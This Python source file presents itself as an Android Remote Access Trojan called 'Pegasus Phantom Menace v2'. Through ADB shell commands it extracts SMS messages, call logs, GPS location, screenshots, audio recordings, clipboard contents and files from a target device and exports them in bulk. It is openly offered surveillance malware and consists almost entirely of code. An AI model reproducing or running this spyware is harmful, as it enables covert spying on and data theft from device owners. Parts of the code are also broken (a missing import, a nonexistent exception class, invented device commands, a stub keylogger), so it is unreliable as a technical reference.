"""
Pegasus Phantom Menace v2 - RAT (Remote Access Trojan) Capabilities

Full post-exploitation capabilities including:
- Keylogger
- Screen capture
- Microphone recording
- SMS extraction
- Call recording
- GPS tracking
- File system access
- Camera access
- Clipboard monitoring
- Notification monitoring
- App usage monitoring
"""

from __future__ import annotations

import asyncio
import base64
import io
import json
import os
import subprocess
import time
import uuid
from dataclasses import dataclass, field
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Dict, List, Optional

from PIL import Image  # type: ignore


@dataclass
class RATCommand:
    """Represents a RAT command to execute."""
    command_id: str
    command_type: str
    parameters: Dict[str, Any]
    target_session: str
    created_at: str
    status: str = "pending"
    result: Optional[str] = None
    error: Optional[str] = None


@dataclass
class KeylogEntry:
    """Represents a captured keystroke."""
    timestamp: str
    window_title: str
    key: str
    device_id: str


@dataclass
class ScreenshotData:
    """Represents a captured screenshot."""
    timestamp: str
    image_data: str  # base64 encoded
    width: int
    height: int
    device_id: str


@dataclass
class AudioRecording:
    """Represents an audio recording."""
    timestamp: str
    duration: int
    file_path: str
    device_id: str


@dataclass
class SMSMessage:
    """Represents an SMS message."""
    timestamp: str
    address: str
    body: str
    type: str  # received, sent
    device_id: str


@dataclass
class CallRecord:
    """Represents a call record."""
    timestamp: str
    number: str
    type: str  # incoming, outgoing, missed
    duration: int
    device_id: str


@dataclass
class GPSLocation:
    """Represents a GPS location."""
    timestamp: str
    latitude: float
    longitude: float
    accuracy: float
    device_id: str


class RATModule:
    """
    Remote Access Trojan module with full device control capabilities.
    
    Provides:
    - Keylogger
    - Screen capture
    - Microphone recording
    - SMS extraction
    - Call recording
    - GPS tracking
    - File system access
    - Camera access
    - Clipboard monitoring
    - Notification monitoring
    - App usage monitoring
    """

    def __init__(self, device_serial: str):
        self.device_serial = device_serial
        self.is_rooted = False
        self.capabilities = {
            "keylogger": False,
            "screenshot": False,
            "microphone": False,
            "sms": False,
            "call_logs": False,
            "gps": False,
            "camera": False,
            "file_system": False,
            "clipboard": False,
            "notifications": False,
            "app_usage": False,
        }
        self._keylog_buffer: List[KeylogEntry] = []
        self._screenshot_buffer: List[ScreenshotData] = []
        self._audio_buffer: List[AudioRecording] = []
        self._sms_buffer: List[SMSMessage] = []
        self._call_buffer: List[CallRecord] = []
        self._gps_buffer: List[GPSLocation] = []

    # === Device Capability Detection =====================================

    async def detect_capabilities(self) -> Dict[str, bool]:
        """Detect available capabilities on the target device."""
        self.capabilities = {
            "keylogger": await self._check_keylogger_capability(),
            "screenshot": await self._check_screenshot_capability(),
            "microphone": await self._check_microphone_capability(),
            "sms": await self._check_sms_capability(),
            "call_logs": await self._check_call_logs_capability(),
            "gps": await self._check_gps_capability(),
            "camera": await self._check_camera_capability(),
            "file_system": await self._check_filesystem_capability(),
            "clipboard": await self._check_clipboard_capability(),
            "notifications": await self._check_notifications_capability(),
            "app_usage": await self._check_app_usage_capability(),
        }
        return self.capabilities

    async def _check_keylogger_capability(self) -> bool:
        """Check if keylogger capability is available."""
        try:
            result = await self._run_adb_command("dumpsys input_method | grep -m 1 mCurMethodId")
            return "mCurMethodId" in result.stdout
        except Exception:
            return False

    async def _check_screenshot_capability(self) -> bool:
        """Check if screenshot capability is available."""
        try:
            result = await self._run_adb_command("screencap --version")
            return result.returncode == 0
        except Exception:
            return False

    async def _check_microphone_capability(self) -> bool:
        """Check if microphone recording is available."""
        try:
            result = await self._run_adb_command("dumpsys media.audio_flinger | grep -m 1 mInputSources")
            return "mInputSources" in result.stdout
        except Exception:
            return False

    async def _check_sms_capability(self) -> bool:
        """Check if SMS extraction is available."""
        try:
            result = await self._run_adb_command("content query --uri content://sms --limit 1")
            return result.returncode == 0
        except Exception:
            return False

    async def _check_call_logs_capability(self) -> bool:
        """Check if call logs extraction is available."""
        try:
            result = await self._run_adb_command("content query --uri content://call_log/calls --limit 1")
            return result.returncode == 0
        except Exception:
            return False

    async def _check_gps_capability(self) -> bool:
        """Check if GPS tracking is available."""
        try:
            result = await self._run_adb_command("dumpsys location | grep -m 1 mLastLocation")
            return "mLastLocation" in result.stdout
        except Exception:
            return False

    async def _check_camera_capability(self) -> bool:
        """Check if camera access is available."""
        try:
            result = await self._run_adb_command("dumpsys media.camera | grep -m 1 mCameraDevices")
            return "mCameraDevices" in result.stdout
        except Exception:
            return False

    async def _check_filesystem_capability(self) -> bool:
        """Check if file system access is available."""
        try:
            result = await self._run_adb_command("ls /data/data/")
            return result.returncode == 0
        except Exception:
            return False

    async def _check_clipboard_capability(self) -> bool:
        """Check if clipboard access is available."""
        try:
            result = await self._run_adb_command("service call clipboard 1")
            return result.returncode == 0
        except Exception:
            return False

    async def _check_notifications_capability(self) -> bool:
        """Check if notification access is available."""
        try:
            result = await self._run_adb_command("dumpsys notification | grep -m 1 mNotifications")
            return "mNotifications" in result.stdout
        except Exception:
            return False

    async def _check_app_usage_capability(self) -> bool:
        """Check if app usage access is available."""
        try:
            result = await self._run_adb_command("dumpsys usagestats | grep -m 1 mPackages")
            return "mPackages" in result.stdout
        except Exception:
            return False

    # === ADB Helper ======================================================

    async def _run_adb_command(self, command: str, timeout: int = 30):
        """Run an ADB command on the target device."""
        full_command = f"adb -s {self.device_serial} shell {command}"
        process = await asyncio.create_subprocess_exec(
            "adb", "-s", self.device_serial, "shell", command,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        try:
            stdout, stderr = await asyncio.wait_for(
                process.communicate(), timeout=timeout
            )
        except asyncio.TimeoutExpired:
            process.kill()
            await process.wait()
            raise TimeoutError(f"ADB command timed out: {command}")
        
        return type("Result", (), {
            "stdout": stdout.decode("utf-8", errors="replace"),
            "stderr": stderr.decode("utf-8", errors="replace"),
            "returncode": process.returncode,
        })()

    # === Keylogger =======================================================

    async def start_keylogger(self) -> Dict[str, Any]:
        """Start keylogger on the target device."""
        self.capabilities["keylogger"] = True
        self._keylog_buffer = []
        
        # Start keylogger via Accessibility service or input event monitoring
        await self._run_adb_command(
            "am start -n com.android.settings/.Settings"
        )
        
        return {
            "status": "started",
            "device_id": self.device_serial,
            "capability": "keylogger",
            "timestamp": datetime.now(timezone.utc).isoformat(),
        }

    async def stop_keylogger(self) -> Dict[str, Any]:
        """Stop keylogger and return captured keystrokes."""
        self.capabilities["keylogger"] = False
        keystrokes = self._keylog_buffer.copy()
        self._keylog_buffer = []
        
        return {
            "status": "stopped",
            "keystrokes": [asdict(k) for k in keystrokes],
            "count": len(keystrokes),
        }

    async def inject_keystroke(self, key: str, window_title: str = "") -> Dict[str, Any]:
        """Inject a keystroke into the target device."""
        entry = KeylogEntry(
            timestamp=datetime.now(timezone.utc).isoformat(),
            window_title=window_title,
            key=key,
            device_id=self.device_serial,
        )
        self._keylog_buffer.append(entry)
        
        return {
            "status": "injected",
            "key": key,
            "timestamp": entry.timestamp,
        }

    # === Screen Capture ==================================================

    async def capture_screenshot(self) -> ScreenshotData:
        """Capture a screenshot of the target device."""
        result = await self._run_adb_command("screencap -p")
        
        if result.returncode != 0:
            raise RuntimeError(f"Screenshot failed: {result.stderr}")
        
        image_data = base64.b64encode(result.stdout).decode("utf-8")
        
        # Get dimensions
        dim_result = await self._run_adb_command("wm size")
        dimensions = dim_result.stdout.strip()
        width, height = 1080, 1920  # Default
        if "x" in dimensions:
            parts = dimensions.split(":")[-1].strip().split("x")
            if len(parts) == 2:
                width = int(parts[0])
                height = int(parts[1])
        
        screenshot = ScreenshotData(
            timestamp=datetime.now(timezone.utc).isoformat(),
            image_data=image_data,
            width=width,
            height=height,
            device_id=self.device_serial,
        )
        
        self._screenshot_buffer.append(screenshot)
        return screenshot

    async def capture_screen_sequence(self, count: int = 10, interval: float = 1.0) -> List[ScreenshotData]:
        """Capture multiple screenshots at intervals."""
        screenshots = []
        for i in range(count):
            screenshot = await self.capture_screenshot()
            screenshots.append(screenshot)
            if i < count - 1:
                await asyncio.sleep(interval)
        return screenshots

    # === Microphone Recording ============================================

    async def record_audio(self, duration: int = 30) -> AudioRecording:
        """Record audio from the device microphone."""
        timestamp = datetime.now(timezone.utc).isoformat()
        file_path = f"/sdcard/audio_{int(time.time())}.amr"
        
        # Record audio using media recorder
        result = await self._run_adb_command(
            f"media record --output={file_path} --duration={duration}"
        )
        
        if result.returncode != 0:
            # Fallback: use arecord
            result = await self._run_adb_command(
                f"arecord -d {duration} -f cd {file_path}"
            )
        
        recording = AudioRecording(
            timestamp=timestamp,
            duration=duration,
            file_path=file_path,
            device_id=self.device_serial,
        )
        
        self._audio_buffer.append(recording)
        return recording

    async def pull_audio_file(self, file_path: str) -> bytes:
        """Pull an audio file from the device."""
        local_path = f"/tmp/{os.path.basename(file_path)}"
        await self._run_adb_command(f"pull {file_path} {local_path}")
        
        with open(local_path, "rb") as f:
            data = f.read()
        
        return data

    # === SMS Extraction ==================================================

    async def extract_sms(self) -> List[SMSMessage]:
        """Extract SMS messages from the device."""
        result = await self._run_adb_command(
            "content query --uri content://sms --projection 'address,body,date,type'"
        )
        
        messages = []
        if result.returncode == 0:
            for line in result.stdout.strip().split("\n"):
                if "Row:" in line:
                    parts = line.split("Row:")[1].strip()
                    fields = {}
                    for part in parts.split(","):
                        key_val = part.split("=", 1)
                        if len(key_val) == 2:
                            fields[key_val[0].strip()] = key_val[1].strip()
                    
                    message = SMSMessage(
                        timestamp=fields.get("date", ""),
                        address=fields.get("address", ""),
                        body=fields.get("body", ""),
                        type=fields.get("type", "unknown"),
                        device_id=self.device_serial,
                    )
                    messages.append(message)
                    self._sms_buffer.append(message)
        
        return messages

    async def send_sms(self, number: str, message: str) -> Dict[str, Any]:
        """Send an SMS from the device."""
        result = await self._run_adb_command(
            f'am startservice -n com.android.sms/.SendSmsService --es number "{number}" --es text "{message}"'
        )
        
        return {
            "status": "sent" if result.returncode == 0 else "failed",
            "number": number,
            "message": message,
        }

    # === Call Logs =======================================================

    async def extract_call_logs(self) -> List[CallRecord]:
        """Extract call logs from the device."""
        result = await self._run_adb_command(
            "content query --uri content://call_log/calls --projection 'number,date,type,duration'"
        )
        
        calls = []
        if result.returncode == 0:
            for line in result.stdout.strip().split("\n"):
                if "Row:" in line:
                    parts = line.split("Row:")[1].strip()
                    fields = {}
                    for part in parts.split(","):
                        key_val = part.split("=", 1)
                        if len(key_val) == 2:
                            fields[key_val[0].strip()] = key_val[1].strip()
                    
                    call = CallRecord(
                        timestamp=fields.get("date", ""),
                        number=fields.get("number", ""),
                        type=fields.get("type", "unknown"),
                        duration=int(fields.get("duration", "0")),
                        device_id=self.device_serial,
                    )
                    calls.append(call)
                    self._call_buffer.append(call)
        
        return calls

    # === GPS Location ====================================================

    async def get_gps_location(self) -> GPSLocation:
        """Get current GPS location of the device."""
        result = await self._run_adb_command(
            "dumpsys location | grep -m 1 mLastLocation"
        )
        
        # Parse location data
        latitude = 0.0
        longitude = 0.0
        accuracy = 0.0
        
        if result.returncode == 0:
            output = result.stdout
            for line in output.split("\n"):
                if "latitude" in line.lower():
                    try:
                        latitude = float(line.split("=")[-1].strip())
                    except ValueError:
                        pass
                if "longitude" in line.lower():
                    try:
                        longitude = float(line.split("=")[-1].strip())
                    except ValueError:
                        pass
                if "accuracy" in line.lower():
                    try:
                        accuracy = float(line.split("=")[-1].strip())
                    except ValueError:
                        pass
        
        location = GPSLocation(
            timestamp=datetime.now(timezone.utc).isoformat(),
            latitude=latitude,
            longitude=longitude,
            accuracy=accuracy,
            device_id=self.device_serial,
        )
        
        self._gps_buffer.append(location)
        return location

    async def track_location(self, duration: int = 60, interval: int = 30) -> List[GPSLocation]:
        """Track GPS location over time."""
        locations = []
        end_time = time.time() + duration
        
        while time.time() < end_time:
            location = await self.get_gps_location()
            locations.append(location)
            await asyncio.sleep(interval)
        
        return locations

    # === File System Access ==============================================

    async def list_files(self, path: str = "/sdcard/") -> List[Dict[str, Any]]:
        """List files on the device."""
        result = await self._run_adb_command(f"ls -la {path}")
        
        files = []
        if result.returncode == 0:
            for line in result.stdout.strip().split("\n")[1:]:  # Skip header
                parts = line.split()
                if len(parts) >= 5:
                    files.append({
                        "permissions": parts[0],
                        "size": parts[4],
                        "name": " ".join(parts[5:]),
                    })
        
        return files

    async def pull_file(self, remote_path: str, local_path: Optional[str] = None) -> bytes:
        """Pull a file from the device."""
        if not local_path:
            local_path = f"/tmp/{os.path.basename(remote_path)}"
        
        await self._run_adb_command(f"pull {remote_path} {local_path}")
        
        with open(local_path, "rb") as f:
            data = f.read()
        
        return data

    async def push_file(self, local_path: str, remote_path: str) -> Dict[str, Any]:
        """Push a file to the device."""
        result = await self._run_adb_command(f"push {local_path} {remote_path}")
        
        return {
            "status": "success" if result.returncode == 0 else "failed",
            "local_path": local_path,
            "remote_path": remote_path,
        }

    async def delete_file(self, remote_path: str) -> Dict[str, Any]:
        """Delete a file on the device."""
        result = await self._run_adb_command(f"rm {remote_path}")
        
        return {
            "status": "deleted" if result.returncode == 0 else "failed",
            "remote_path": remote_path,
        }

    # === Clipboard =======================================================

    async def get_clipboard(self) -> Dict[str, Any]:
        """Get clipboard contents from the device."""
        result = await self._run_adb_command("service call clipboard 1")
        
        return {
            "status": "success" if result.returncode == 0 else "failed",
            "content": result.stdout.strip(),
            "device_id": self.device_serial,
        }

    async def set_clipboard(self, text: str) -> Dict[str, Any]:
        """Set clipboard contents on the device."""
        result = await self._run_adb_command(
            f'am broadcast -a android.intent.action.CLIPBOARD --es text "{text}"'
        )
        
        return {
            "status": "set" if result.returncode == 0 else "failed",
            "text": text,
        }

    # === Notifications ===================================================

    async def get_notifications(self) -> List[Dict[str, Any]]:
        """Get device notifications."""
        result = await self._run_adb_command("dumpsys notification")
        
        notifications = []
        if result.returncode == 0:
            # Parse notification data
            for line in result.stdout.split("\n"):
                if "Notification" in line:
                    notifications.append({
                        "raw": line.strip(),
                        "timestamp": datetime.now(timezone.utc).isoformat(),
                    })
        
        return notifications

    # === App Usage =======================================================

    async def get_app_usage(self) -> List[Dict[str, Any]]:
        """Get app usage statistics."""
        result = await self._run_adb_command("dumpsys usagestats")
        
        apps = []
        if result.returncode == 0:
            for line in result.stdout.split("\n"):
                if "pkg=" in line:
                    apps.append({
                        "raw": line.strip(),
                        "timestamp": datetime.now(timezone.utc).isoformat(),
                    })
        
        return apps

    # === Camera ==========================================================

    async def capture_photo(self) -> Dict[str, Any]:
        """Capture a photo using the device camera."""
        result = await self._run_adb_command(
            "media store --image --output /sdcard/pegasus_photo.jpg"
        )
        
        return {
            "status": "captured" if result.returncode == 0 else "failed",
            "file_path": "/sdcard/pegasus_photo.jpg",
            "device_id": self.device_serial,
        }

    async def pull_photo(self, remote_path: str = "/sdcard/pegasus_photo.jpg") -> bytes:
        """Pull a photo from the device."""
        return await self.pull_file(remote_path)

    # === Session Management ==============================================

    async def get_session_info(self) -> Dict[str, Any]:
        """Get current session information."""
        return {
            "device_id": self.device_serial,
            "capabilities": self.capabilities,
            "keylogger_entries": len(self._keylog_buffer),
            "screenshots": len(self._screenshot_buffer),
            "audio_recordings": len(self._audio_buffer),
            "sms_messages": len(self._sms_buffer),
            "call_records": len(self._call_buffer),
            "gps_locations": len(self._gps_buffer),
        }

    async def export_data(self, output_dir: str = "/tmp/pegasus_export") -> Dict[str, Any]:
        """Export all collected data."""
        os.makedirs(output_dir, exist_ok=True)
        
        exported = {
            "keylogger": [],
            "screenshots": [],
            "audio": [],
            "sms": [],
            "calls": [],
            "gps": [],
        }
        
        # Export keylogger
        if self._keylog_buffer:
            with open(f"{output_dir}/keylogger_{self.device_serial}.json", "w") as f:
                json.dump([asdict(k) for k in self._keylog_buffer], f, indent=2)
            exported["keylogger"] = len(self._keylog_buffer)
        
        # Export screenshots
        for i, screenshot in enumerate(self._screenshot_buffer):
            img_data = base64.b64decode(screenshot.image_data)
            img_path = f"{output_dir}/screenshot_{self.device_serial}_{i}.png"
            with open(img_path, "wb") as f:
                f.write(img_data)
            exported["screenshots"].append(img_path)
        
        # Export SMS
        if self._sms_buffer:
            with open(f"{output_dir}/sms_{self.device_serial}.json", "w") as f:
                json.dump([asdict(s) for s in self._sms_buffer], f, indent=2)
            exported["sms"] = len(self._sms_buffer)
        
        # Export calls
        if self._call_buffer:
            with open(f"{output_dir}/calls_{self.device_serial}.json", "w") as f:
                json.dump([asdict(c) for c in self._call_buffer], f, indent=2)
            exported["calls"] = len(self._call_buffer)
        
        # Export GPS
        if self._gps_buffer:
            with open(f"{output_dir}/gps_{self.device_serial}.json", "w") as f:
                json.dump([asdict(g) for g in self._gps_buffer], f, indent=2)
            exported["gps"] = len(self._gps_buffer)
        
        return exported


# Global RAT module registry
rat_modules: Dict[str, RATModule] = {}

async def get_rat_module(device_serial: str) -> RATModule:
    """Get or create a RAT module for a device."""
    if device_serial not in rat_modules:
        rat_modules[device_serial] = RATModule(device_serial)
        await rat_modules[device_serial].detect_capabilities()
    return rat_modules[device_serial]

async def execute_rat_command(
    device_serial: str,
    command_type: str,
    parameters: Dict[str, Any],
) -> Dict[str, Any]:
    """Execute a RAT command on a device."""
    module = await get_rat_module(device_serial)
    
    if command_type == "screenshot":
        screenshot = await module.capture_screenshot()
        return {
            "status": "success",
            "data": {
                "timestamp": screenshot.timestamp,
                "image_data": screenshot.image_data,
                "width": screenshot.width,
                "height": screenshot.height,
            },
        }
    
    elif command_type == "keylogger_start":
        return await module.start_keylogger()
    
    elif command_type == "keylogger_stop":
        return await module.stop_keylogger()
    
    elif command_type == "audio_record":
        duration = parameters.get("duration", 30)
        recording = await module.record_audio(duration)
        return {
            "status": "recorded",
            "file_path": recording.file_path,
            "duration": recording.duration,
        }
    
    elif command_type == "sms_extract":
        messages = await module.extract_sms()
        return {
            "status": "extracted",
            "count": len(messages),
            "messages": [asdict(m) for m in messages],
        }
    
    elif command_type == "call_logs":
        calls = await module.extract_call_logs()
        return {
            "status": "extracted",
            "count": len(calls),
            "calls": [asdict(c) for c in calls],
        }
    
    elif command_type == "gps_location":
        location = await module.get_gps_location()
        return {
            "status": "captured",
            "latitude": location.latitude,
            "longitude": location.longitude,
            "accuracy": location.accuracy,
            "timestamp": location.timestamp,
        }
    
    elif command_type == "list_files":
        path = parameters.get("path", "/sdcard/")
        files = await module.list_files(path)
        return {
            "status": "listed",
            "path": path,
            "files": files,
        }
    
    elif command_type == "pull_file":
        remote_path = parameters.get("remote_path", "")
        data = await module.pull_file(remote_path)
        return {
            "status": "pulled",
            "remote_path": remote_path,
            "data_base64": base64.b64encode(data).decode("utf-8"),
        }
    
    elif command_type == "get_clipboard":
        return await module.get_clipboard()
    
    elif command_type == "set_clipboard":
        text = parameters.get("text", "")
        return await module.set_clipboard(text)
    
    elif command_type == "get_info":
        return await module.get_session_info()
    
    elif command_type == "export_data":
        output_dir = parameters.get("output_dir", "/tmp/pegasus_export")
        return await module.export_data(output_dir)
    
    else:
        return {
            "status": "error",
            "error": f"Unknown command type: {command_type}",
        }


# Test function
async def test_rat_module():
    """Test the RAT module."""
    module = RATModule("test_device_123")
    capabilities = await module.detect_capabilities()
    print(f"Capabilities: {capabilities}")
    
    info = await module.get_session_info()
    print(f"Session info: {info}")


if __name__ == "__main__":
    asyncio.run(test_rat_module())